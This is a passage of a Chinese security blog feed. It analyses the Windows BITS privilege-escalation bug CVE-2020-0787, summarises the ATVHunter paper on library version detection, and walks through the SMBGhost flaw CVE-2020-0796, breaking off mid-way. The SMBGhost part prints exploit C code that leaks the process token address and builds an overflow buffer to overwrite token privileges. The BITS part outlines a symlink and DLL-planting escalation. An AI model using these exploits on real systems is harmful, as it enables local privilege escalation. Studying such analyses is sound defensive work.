class="header-anchor">#</a></h3><p>选择了懒人配置方法，一般大家都用virtualkd,但是由于VMware版本太高了，所以用了修复版的<a href="https://github.com/4d61726b/VirtualKD-Redux">VirtualKD-Redux</a>，还比virtualkd多了一个Windbg Preview的选项，十分的人性<br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-25-03-upload_457648175f4baa48e70731577fc2a659.png" alt="img"></p><h3><span id="pdbgview">DbgView</span><a href="#pdbgview" class="header-anchor">#</a></h3><p>为了捕捉内核调试信息，在Guest安装DbgView，以管理员权限启动，此时使用默认exp测试，Windbg Preview可以捕捉到输出的调试信息<br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-25-03-upload_ad980e2c9ea322ce3125969a6d294495.png" alt="img"></p>]]></content>
      <categories>
        <category>research</category>
        <category>HEVD</category>
      </categories>
      <tags>
        <tag>research</tag>
        <tag>HEVD</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-0787 BITS任意文件移动漏洞</title>
    <url>/57177eae.html</url>
    <content><![CDATA[<p>漏洞组件：后台智能传输服务模块(BITS)</p><p>组件特点：</p><ol><li>从HTTP Web服务器和SMB文件共享下载文件或将文件上传到HTTP Web服务器和SMB文件共享。</li><li>BITS将考虑传输成本以及网络使用情况，以便用户的前台工作影响尽可能小</li><li>即使重新启动后，BITS也可以处理网络中断，暂停并自动恢复传输。</li></ol><a id="more"></a><h2><span id="prpc-fu-wu-mo-shi">RPC服务模式</span><a href="#prpc-fu-wu-mo-shi" class="header-anchor">#</a></h2><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-upload_44789d7d062e19c78bce46b7930b2fe6.png" alt="img"></p><h2><span id="pfa-xian-guo-cheng">发现过程</span><a href="#pfa-xian-guo-cheng" class="header-anchor">#</a></h2><h3><span id="pbits-fu-wu-jie-kou">BITS服务接口</span><a href="#pbits-fu-wu-jie-kou" class="header-anchor">#</a></h3><p>BITS服务存在多个不同版本的类，是“控件类”的不同迭代，且存在一个旧版“控件类”<br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-upload_661b3b8c43a28e43d427abb6b64160bf.png" alt="img"></p><p>可以看到存在一个1.0版本的COM类和一个旧版本的类，暂且用新类和旧类指代<br>新类中存在一个IBackgroundCopyManager接口，旧类存在一个IBackgroundCopyQMgr接口</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-upload_aebed025b963fa1817565410b76b7be3.png" alt="img"></p><p>可以看到BITS服务是以System权限执行的</p><h3><span id="pxin-lei-fen-xi">新类分析</span><a href="#pxin-lei-fen-xi" class="header-anchor">#</a></h3><p>新类调用流程</p><ol><li>创建BIT控制类（CLSID：<code>4991D34B-80A1-4291-83B6-3328366B9097</code>）的实例，通过<code>CoCreateInstance()</code>接口获得一个指向<code>IBackgroundCopyManager</code>的指针</li><li><code>IBackgroundCopyManager</code>，调用<code>IBackgroundCopyManager::CreateJob()</code>获取指向该<code>IBackgroundCopyJob</code>接口的指针。</li><li><code>IBackgroundCopyJob</code>调用<code>IBackgroundCopyJob::AddFile(URL, LOCAL_FILE)</code>将文件添加到下载任务中，这需要两个参数：URL和本地文件路径。</li><li>调用<code>IBackgroundCopyJob::Resume()</code>设置为<code>SUSPENDED</code>状态，并在工作的状态为<code>TRANSFERRED</code>时调用<code>IBackgroundCopyJob::Complete()</code>。</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CoCreateInstance(CLSID_4991D34B-80A1-4291-83B6-3328366B9097)   -&gt; IBackgroundCopyManager*</span><br><span class="line">|__ IBackgroundCopyManager::CreateJob()                        -&gt; IBackgroundCopyJob*</span><br><span class="line">    |__ IBackgroundCopyJob::AddFile(URL, LOCAL_FILE) </span><br><span class="line">    |__ IBackgroundCopyJob::Resume() </span><br><span class="line">    |__ IBackgroundCopyJob::Complete()</span><br></pre></td></tr></table></figure><h3><span id="pjiu-lei-fen-xi">旧类分析</span><a href="#pjiu-lei-fen-xi" class="header-anchor">#</a></h3><p>旧类调用流程</p><ol><li>创建传统BIT控制类（CLSID：<code>69AD4AEE-51BE-439B-A92C-86AE490E8B30</code>）的实例，调用<code>CoCreateInstance()</code>获得一个指向<code>IBackgroundCopyQMgr</code>的指针。</li><li><code>IBackgroundCopyQMgr</code>调用<code>IBackgroundCopyQMgr::CreateGroup()</code>获取指向<code>IBackgroundCopyGroup</code>的指针</li><li><code>IBackgroundCopyGroup</code>调用<code>IBackgroundCopyGroup::CreateJob()</code>获取指向<code>IBackgroundCopyJob1</code>指针。</li><li><code>IBackgroundCopyJob1</code>调用<code>IBackgroundCopyJob1::AddFiles()</code>将文件添加到任务中。</li><li>调用<code>IBackgroundCopyJob1::Resume()</code>设置为<code>SUSPENDED</code>状态，，并在工作的状态<code>TRANSFERRED</code>时调用<code>IBackgroundCopyJob1::Complete()</code>。</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CoCreateInstance(CLSID_69AD4AEE-51BE-439B-A92C-86AE490E8B30)   -&gt; IBackgroundCopyQMgr*</span><br><span class="line">|__ IBackgroundCopyQMgr::CreateGroup()                         -&gt; IBackgroundCopyGroup*</span><br><span class="line">    |__ IBackgroundCopyGroup::CreateJob()                      -&gt; IBackgroundCopyJob1*</span><br><span class="line">        |__ IBackgroundCopyJob1::AddFiles(FILESETINFO)</span><br><span class="line">        |__ IBackgroundCopyJob1::Resume()</span><br><span class="line">        |__ IBackgroundCopyJob1::Complete()</span><br></pre></td></tr></table></figure><h3><span id="pfa-xian-wen-ti-querynewjobinterface">发现问题 QueryNewJobInterface</span><a href="#pfa-xian-wen-ti-querynewjobinterface" class="header-anchor">#</a></h3><p>IBackgroundCopyGroup接口的文档中，该接口有13种方法<br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-upload_f1db0bf11e0dd83923627961157986d7.png" alt="img"></p><p>但是OleView显示有15个接口<br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-upload_70b447b4cd49e6be72e0e681c0c19ffd.png" alt="img"></p><p>从头文件中qmgr.中找到proc16定义如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">virtual HRESULT STDMETHODCALLTYPE QueryNewJobInterface( </span><br><span class="line">            &#x2F;* [in] *&#x2F; __RPC__in REFIID iid,</span><br><span class="line">            &#x2F;* [iid_is][out] *&#x2F; __RPC__deref_out_opt IUnknown **pUnk) &#x3D; 0;</span><br><span class="line">            </span><br><span class="line">virtual HRESULT QueryNewJobInterface(REFIID iid, IUnknown **pUnk);</span><br></pre></td></tr></table></figure><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-upload_e359d3df7d387cf239eaf0bc9b160c13.png" alt="img"><br>先与GUID <code>37668d37-507e-4160-9316-26306d150b12</code>比较，成功后调用<code>CJob::GetJobExternal</code>函数</p><p>而GUID <code>37668d37-507e-4160-9316-26306d150b12</code>是<code>IBackgroundCopyJob</code>的GUID，也就是说旧版本的代码可以通过未在文档中列出的<code>QueryNewJobInterface</code>接口，获取新版本中的<code>IBackgroundCopyJob</code>方法指针，也就是说可能会出现跨版本的代码调用</p><h3><span id="pcai-ce-ke-yi-wan-cheng-de-liu-cheng">猜测可以完成的流程</span><a href="#pcai-ce-ke-yi-wan-cheng-de-liu-cheng" class="header-anchor">#</a></h3><ol><li>创建指向旧类的实例，获取指向IBackgroundCopyQMgr接口的指针</li><li>创建一个新组调用IBackgroundCopyQMgr::CreateGroup()，获取一个指向IBackgroundCopyGroup接口的指针</li><li>创建一个job，调用IBackgroundCopyGroup::CreateJob()，获取一个指向IBackgroundCopyJob1接口的指针</li><li>通过IBackgroundCopyJob1::AddFiles()添加文件</li><li>调用IBackgroundCopyGroup::QueryNewJobInterface()方法并获得指向未知接口的指针，假定它是一个IBackgroundCopyJob接口</li><li>通过调用IBackgroundCopyJob接口的Resume() 和 Complete()来恢复和完成job而不是IBackgroundCopyJob1接口</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CoCreateInstance(CLSID_69AD4AEE-51BE-439B-A92C-86AE490E8B30)   -&gt; IBackgroundCopyQMgr*</span><br><span class="line">|__ IBackgroundCopyQMgr::CreateGroup()                         -&gt; IBackgroundCopyGroup*</span><br><span class="line">    |__ IBackgroundCopyGroup::CreateJob()                      -&gt; IBackgroundCopyJob1*</span><br><span class="line">       |__ IBackgroundCopyJob1::AddFiles(FILESETINFO)</span><br><span class="line">|__ IBackgroundCopyGroup::QueryNewJobInterface()               -&gt; IBackgroundCopyJob</span><br><span class="line">    |__ IBackgroundCopyJob1::Resume()</span><br><span class="line">    |__ IBackgroundCopyJob1::Complete()</span><br></pre></td></tr></table></figure><h3><span id="ppoc-yan-shi">poc演示</span><a href="#ppoc-yan-shi" class="header-anchor">#</a></h3><p>将<code>\\127.0.0.1\C$\Windows\System32\drivers\etc\hosts</code>下载到本地<code>C:\Temp\test.txt</code><br>调用AddFiles创建tmp文件，当前用户<br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-upload_8c44d8d2212335641647e6f1d279b87a.png" alt="img"></p><p>调用Resume写入文件，当前用户<br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-upload_b5d24c6cefbfccde6d883a575e77d3aa.png" alt="img"></p><p>最后重命名文件<br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-upload_edb85cd0202468a842c0745d7ff074a3.png" alt="img"><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-upload_036876f809536bea42ce7b6f879f85dc.png" alt="img"></p><p>此时为System权限</p><h3><span id="plou-dong-fen-xi">漏洞分析</span><a href="#plou-dong-fen-xi" class="header-anchor">#</a></h3><p>客户端调用Resume过程</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(CLIENT) IBackgroundCopyJob::Resume()</span><br><span class="line">   |</span><br><span class="line">   V</span><br><span class="line">(SERVER) CJobExternal::Resume()</span><br><span class="line">         |__ CJobExternal::ResumeInternal()</span><br><span class="line">             |__ ...</span><br><span class="line">             |__ CJob::CheckClientAccess() &#x2F;&#x2F; Client impersonation</span><br><span class="line">             |__ CJob::Resume()</span><br><span class="line">             |__ ...</span><br></pre></td></tr></table></figure><p>客户端调用Complete过程</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(CLIENT) IBackgroundCopyJob::Complete()</span><br><span class="line">   |</span><br><span class="line">   V</span><br><span class="line">(SERVER) CJobExternal::Complete()</span><br><span class="line">         |__ CJobExternal::CompleteInternal()</span><br><span class="line">             |__ ...</span><br><span class="line">             |__ CJob::CheckClientAccess() &#x2F;&#x2F; Client impersonation</span><br><span class="line">             |__ CJob::Complete()</span><br><span class="line">             |__ ...</span><br></pre></td></tr></table></figure><p>由于都会读取客户端token权限并进行检查，因此不能提权</p><h4><span id="pzheng-chang-qing-kuang">正常情况</span><a href="#pzheng-chang-qing-kuang" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(CLIENT) IBackgroundCopyGroup::CreateJob()</span><br><span class="line">   |</span><br><span class="line">   V</span><br><span class="line">(SERVER) COldGroupInterface::CreateJob()</span><br><span class="line">         |__ COldGroupInterface::CreateJobInternal()</span><br><span class="line">             |__ CLockedJobWritePointer::ValidateAccess()</span><br><span class="line">             |   |__ CJob::CheckClientAccess() &#x2F;&#x2F; Client impersonation</span><br><span class="line">             |__ CJob::GetOldJobExternal() &#x2F;&#x2F; IBackgroundCopyJob1* returned</span><br></pre></td></tr></table></figure><p>返回的是代表客户端的token权限的接口</p><h4><span id="pti-quan-qing-kuang">提权情况</span><a href="#pti-quan-qing-kuang" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(CLIENT) IBackgroundCopyGroup::QueryNewJobInterface()</span><br><span class="line">   |</span><br><span class="line">   V</span><br><span class="line">(SERVER) COldGroupInterface::QueryNewJobInterface()</span><br><span class="line">         |__ CJob::GetJobExternal() &#x2F;&#x2F; IBackgroundCopyJob* returned</span><br></pre></td></tr></table></figure><p>由于在这里未检查token，因此返回了代表服务端System权限的接口给客户端，后续客户端都是以System权限进行Resume和Complete等操作。</p><h2><span id="plou-dong-li-yong">漏洞利用</span><a href="#plou-dong-li-yong" class="header-anchor">#</a></h2><p>通过符号链接的方式写入dll进行提权。</p><ol><li>本地创建job进行下载，在tmp文件上设置Oplock</li><li>恢复执行后该服务会写入TMP文件触发Oplock</li><li>此时切换挂载点到对象目录，创建符号链接，tmp文件指向fake.dll，本地文件指向system32文件夹中的dll</li><li>释放Oplock，由于是以System权限进行文件移动，因此会将fake.dll移动到system32文件夹下，实现提权</li></ol><h2><span id="pxiu-bu-fang-shi">修补方式</span><a href="#pxiu-bu-fang-shi" class="header-anchor">#</a></h2><p>修改Windows BITS 处理符号链接的方式来修复此漏洞</p><h2><span id="pcan-kao-zi-liao">参考资料</span><a href="#pcan-kao-zi-liao" class="header-anchor">#</a></h2><ul><li><a href="https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal">https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal</a></li><li><a href="https://xz.aliyun.com/t/7935">https://xz.aliyun.com/t/7935</a></li><li><a href="https://itm4n.github.io/cve-2020-0787-windows-bits-eop/">https://itm4n.github.io/cve-2020-0787-windows-bits-eop/</a></li><li><a href="https://github.com/itm4n/BitsArbitraryFileMove">https://github.com/itm4n/BitsArbitraryFileMove</a></li><li><a href="https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION">https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION</a></li><li><a href="https://packetstormsecurity.com/files/158056/Background-Intelligent-Transfer-Service-Privilege-Escalation.html">https://packetstormsecurity.com/files/158056/Background-Intelligent-Transfer-Service-Privilege-Escalation.html</a></li></ul>]]></content>
      <categories>
        <category>research</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>research</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>ATVHUNTER:Reliable Version Detection of Third-Party Libraries for Vulnerability Identification in Android Applications(ICSE 2021)</title>
    <url>/953aec69.html</url>
    <content><![CDATA[<h2><span id="pji-ben-jie-shao">基本介绍</span><a href="#pji-ben-jie-shao" class="header-anchor">#</a></h2><p>**研究背景：**安卓中第三方库(TPLs)使用十分常见，检测第三方库对于漏洞识别等都十分有用，但是由于TPL的分散性、直接或间接的依赖性以及应用中TPL信息的不透明性，现有工具不能很好的检测，更不用说检测具体某版本</p><a id="more"></a><p><strong>研究挑战：</strong></p><p>现有的TPL检测技术使用基于聚类的方法或相似性比较方法。但是聚类方法只能用于识别常用TPL且难以区分TPL版本，而相似性方法所依赖的TPL数据集规模远小于实际应用市场的TPL集合，导致这两种方式低召回率、难以精确识别版本的问题。对于TPL的检测，作者总结了三个挑战：</p><ol><li>缺乏易受攻击的TPL版本数据集。</li><li>缺乏精确表述TPL版本的方法。</li><li>大量代码混淆导致TPL识别的困难。</li></ol><p><strong>研究贡献：</strong></p><ul><li>ATVHunter：高效的TPL版本检测工具，可以找到app的TPL中存在的漏洞并给出报告</li><li>一个大型TPL数据集：包含189,545个不同的TPL，具有3,006,676个版本<ul><li>包含957个TPL中的1180个CVE，共38243个有漏洞的版本</li><li>162个TPL中的224个安全bug，共4533个版本</li></ul></li><li>大数据分析：利用ATVHunter对104,446个安卓应用进行了大规模分析，发现9,050个应用程序包含具有53,337个漏洞和7,480个易受攻击的TPL版本</li></ul><h2><span id="patvhunter">ATVHunter</span><a href="#patvhunter" class="header-anchor">#</a></h2><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210317185140023.png" alt="image-20210317185140023"></p><p>主要分为下面两部分：</p><ul><li>TPL版本检测</li><li>TPL漏洞检测</li></ul><h3><span id="ptpl-ban-ben-jian-ce">TPL版本检测</span><a href="#ptpl-ban-ben-jian-ce" class="header-anchor">#</a></h3><ul><li>Preprocessing</li><li>Module Decoupling</li><li>Feature Generation</li><li>Library Identification</li></ul><h4><span id="ppreprocessing">Preprocessing</span><a href="#ppreprocessing" class="header-anchor">#</a></h4><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210323085634848.png" alt="image-20210323085634848" style="zoom:50%"><ul><li>Decompiling：反编译输入的app，将bytecode转为中间IR表示</li><li>Primary module elimination：识别app中的主要模块并移除，尽可能地除去host app（primary module）对TPLs（non-primary module）的影响。</li></ul><h4><span id="pmodule-decoupling">Module Decoupling</span><a href="#pmodule-decoupling" class="header-anchor">#</a></h4><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210323085713593.png" alt="image-20210323085713593" style="zoom:50%"><ul><li>把non-primary module拆分为独立的候选库</li></ul><p>这里作者不采用诸如包依赖图（PDG）这类易受package flattening影响的方式，而是采用类依赖关系，从而克服了之前的问题</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210323085759307.png" alt="image-20210323085759307"></p><p>主要选取以下<strong>类依赖关系</strong>:</p><ol><li><p>类继承(不考虑interface)</p></li><li><p>方法调用关系</p></li><li><p>作用域关系</p></li></ol><p>使用CDG区分TPL的文件，作为备选TPL</p><h4><span id="pfeature-generation">Feature Generation</span><a href="#pfeature-generation" class="header-anchor">#</a></h4><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210323085921645.png" alt="image-20210323085921645" style="zoom:50%"><p><strong>粗粒度的特征生成</strong>：基于CFG，用于定位潜在的TPL</p><ol><li>根据CFG为节点编号0 1 2 …</li><li>节点n的子节点中出边最多的编号为n+1，其他节点编号为n+2</li><li>生成签名(节点数，邻接列表hash值) ：邻接列表示例: parent1-&gt;(child1,child2…)</li></ol><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210323090100273.png" alt="image-20210323090100273"></p><p><strong>细粒度的特征生成</strong>：基于CFG中每个基本块的Opcode，用于区分TPL的版本，使用fuzzing hash计算hash，避免传统 hash算法在相似性比对上的缺陷</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210323090151852.png" alt="image-20210323090151852"></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210323090218730.png" alt="image-20210323090218730"></p><p>普通hash有细微差别结果就会差距很大，而Fuzzing hash是先分片再hash，最后组合，因此部分差别对结果影响不大。表现为hash值相似</p><h4><span id="plibrary-identification">Library Identification</span><a href="#plibrary-identification" class="header-anchor">#</a></h4><p><strong>TPL数据库构造</strong>：从Maven Repository爬取了3,006,676个版本的软件，获取到了189,545个TPL，提取粗粒度和细粒度的特征存储到Mongodb中(300GB特征)</p><p><strong>粗粒度和细粒度结合</strong>，先通过粗粒度识别TPL，再通过细粒度识别版本</p><p><strong>库匹配</strong>:</p><ol><li><p>通过包名缩小比较范围(只用于缩小范围) 并且判断是否被混淆</p></li><li><p>根据类数目继续缩小范围(去除数目差太大的)</p></li><li><p>粗粒度根据CFG搜索</p></li></ol><p><strong>版本匹配</strong>:</p><ol><li><p>methods相似度匹配算法(根据编辑距离)，阈值0.85</p></li><li><p>TPL相似度计算算法，阈值0.95</p></li></ol><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210323090430045.png" alt="image-20210323090430045"></p><h3><span id="ptpl-lou-dong-jian-ce">TPL漏洞检测</span><a href="#ptpl-lou-dong-jian-ce" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210323090449430.png" alt="image-20210323090449430"></p><p>收集了1,180 CVEs from 957 unique TPLs with 38,243 affected versions. 当检测出TPL版本后在漏洞数据库中进行搜索并生成报告</p><h3><span id="pevalutaion">Evalutaion</span><a href="#pevalutaion" class="header-anchor">#</a></h3><p>工具链:APKTool(反编译)+Soot(CFG)+ssdeep(Fuzzing Hash)</p><h4><span id="pzhun-que-lu">准确率</span><a href="#pzhun-que-lu" class="header-anchor">#</a></h4><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210323090537158.png" alt="image-20210323090537158"></p><h4><span id="pshi-jian-xiao-lu">时间效率</span><a href="#pshi-jian-xiao-lu" class="header-anchor">#</a></h4><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210323090553969.png" alt="image-20210323090553969"></p><h4><span id="pkang-hun-yao-xing-neng">抗混淆性能</span><a href="#pkang-hun-yao-xing-neng" class="header-anchor">#</a></h4><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210323090613556.png" alt="image-20210323090613556"></p><h4><span id="pda-gui-mo-shu-ju-fen-xi">大规模数据分析</span><a href="#pda-gui-mo-shu-ju-fen-xi" class="header-anchor">#</a></h4><p>数据集:搜集了33个分类下，下载量1w-500w的最新版app共104,446个 其中73110个app包含TPL</p><p>发现: 9050/73110个app存在问题，涵盖53337个漏洞和7480个安全漏洞</p><h3><span id="pge-ren-gan-xiang">个人感想</span><a href="#pge-ren-gan-xiang" class="header-anchor">#</a></h3><ol><li><p>研究基础：通过对9个工具的统计调研发现不足(ASE 2020)</p></li><li><p>大规模的实验直接展示了当前软件安全现状，容易吸引眼球</p></li></ol>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>automatic_analyse</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>automatic analyse</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-0796 SMB Ghost 整数溢出漏洞</title>
    <url>/6ba048bc.html</url>
    <content><![CDATA[<p>漏洞位置：SMB服务驱动srv2.sys和srvnet.sys</p><p>漏洞原因：用户态可控数据传入内核，SMB在解压数据包的时候使用客户端传过来的长度进行解压时,并没有检查长度是否合法，导致整数溢出，最后通过构造payload，实现任意地址写，替换token权限提权</p><a id="more"></a><h3><span id="plou-dong-fen-xi">漏洞分析</span><a href="#plou-dong-fen-xi" class="header-anchor">#</a></h3><h4><span id="psmb-jin-cheng-quan-xian">SMB进程权限</span><a href="#psmb-jin-cheng-quan-xian" class="header-anchor">#</a></h4><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210322195405185.png" alt="image-20210322195405185"></p><p>SMB服务使用端口为139和445端口，可以查到对应进程为PID，也就是权限为system的System.exe进程</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210322195418464.png" alt="image-20210322195418464"></p><p>因此进程token即为System token</p><h4><span id="psmb-ge-shi">SMB格式</span><a href="#psmb-ge-shi" class="header-anchor">#</a></h4><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-a170aa23-6d62-45a4-a8d0-eb4d757e38f2.png" alt="img"></p><p>SMB Compression Transform Header的结构</p><ul><li>ProtocolId ：4字节，固定为0x424D53FC</li><li>OriginalComressedSegmentSize ：4字节，原始的未压缩数据大小</li><li>CompressionAlgorithm ：2字节，压缩算法</li><li>Flags ：2字节，详见协议文档</li><li>Offset/Length ：根据Flags的取值为Offset或者Length，Offset表示数据包中压缩数据相对于当前结构的偏移</li></ul><h4><span id="plou-dong-wei-zhi">漏洞位置</span><a href="#plou-dong-wei-zhi" class="header-anchor">#</a></h4><p>OriginalCompressedSegmentSize和Offset/Length是由用户控制的数值，且为32位长度，在函数Srv2DecompressData中，由于需要先申请一块内存，因此调用SrvNetAllocateBuffer申请内存，长度参数为下面红框相加部分，由于没有检查溢出(OriginalCompressedSegmentSize+Offset)，因此溢出后可以分配到一个很小的空间</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-23-03-image-20210322195439665.png" alt="image-20210322195439665"></p><h3><span id="pexp-fen-xi">exp分析</span><a href="#pexp-fen-xi" class="header-anchor">#</a></h3><ul><li>创建SMB Server的连接</li><li>获取自身token数据结构中privilege成员在内核中的地址tokenAddr</li><li>发送畸形数据触发漏洞，包含tokenAddr、权限数据、占位数据</li><li>触发漏洞，修改tokenAddr地址处权限数据，提升自身权限</li><li>控制winlogon，创建System权限shell</li></ul><h4><span id="pchuang-jian-smb-lian-jie">创建SMB连接</span><a href="#pchuang-jian-smb-lian-jie" class="header-anchor">#</a></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (LOBYTE(wsaData.wVersion) != <span class="number">2</span> || HIBYTE(wsaData.wVersion) != <span class="number">2</span>) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Couldn't find a usable version of Winsock.dll\n"</span>);</span><br><span class="line">	WSACleanup();</span><br><span class="line">	<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (sock == INVALID_SOCKET) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"socket() failed with error: %d\n"</span>, WSAGetLastError());</span><br><span class="line">	WSACleanup();</span><br><span class="line">	<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sockaddr_in client;</span><br><span class="line">client.sin_family = AF_INET;</span><br><span class="line">client.sin_port = htons(<span class="number">445</span>);</span><br><span class="line">InetPton(AF_INET, <span class="string">"127.0.0.1"</span>, &amp;client.sin_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">connect</span>(sock, (sockaddr*)&amp; client, <span class="keyword">sizeof</span>(client)) == SOCKET_ERROR) &#123;</span><br><span class="line">	<span class="keyword">return</span> error_exit(sock, <span class="string">"connect()"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Successfully connected socket descriptor: %d\n"</span>, (<span class="keyword">int</span>)sock);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Sending SMB negotiation request...\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (send_negotiation(sock) == SOCKET_ERROR) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Couldn't finish SMB negotiation\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> error_exit(sock, <span class="string">"send()"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Finished SMB negotiation\n"</span>);</span><br></pre></td></tr></table></figure><h4><span id="phuo-qu-zi-shen-jin-cheng-token-di-zhi">获取自身进程token地址</span><a href="#phuo-qu-zi-shen-jin-cheng-token-di-zhi" class="header-anchor">#</a></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">ULONG64 <span class="title">get_process_token</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	HANDLE token;</span><br><span class="line">	HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());</span><br><span class="line">	<span class="keyword">if</span> (proc == INVALID_HANDLE_VALUE)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &amp;token);</span><br><span class="line">	ULONG64 ktoken = get_handle_addr(token);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ktoken;</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">    ktoken = get_process_token();</span><br><span class="line">	<span class="keyword">if</span> (ktoken == <span class="number">-1</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Couldn't leak ktoken of current process...\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Found kernel token at %#llx\n"</span>, ktoken);</span><br></pre></td></tr></table></figure><h4><span id="pzhun-bei-payload">准备payload</span><a href="#pzhun-bei-payload" class="header-anchor">#</a></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">   ULONG buffer_size = <span class="number">0x1110</span>;</span><br><span class="line">UCHAR *<span class="built_in">buffer</span> = (UCHAR *)<span class="built_in">malloc</span>(buffer_size);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">buffer</span> == <span class="literal">NULL</span>) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Couldn't allocate memory with malloc()\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> error_exit(sock, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">memset</span>(<span class="built_in">buffer</span>, <span class="string">'A'</span>, <span class="number">0x1108</span>);</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(<span class="built_in">buffer</span> + <span class="number">0x1108</span>) = ktoken + <span class="number">0x40</span>; <span class="comment">/* where we want to write */</span></span><br></pre></td></tr></table></figure><h4><span id="pgou-zao-bing-fa-song-ya-suo-hou-de-shu-ju">构造并发送压缩后的数据</span><a href="#pgou-zao-bing-fa-song-ya-suo-hou-de-shu-ju" class="header-anchor">#</a></h4><figure class="highlight 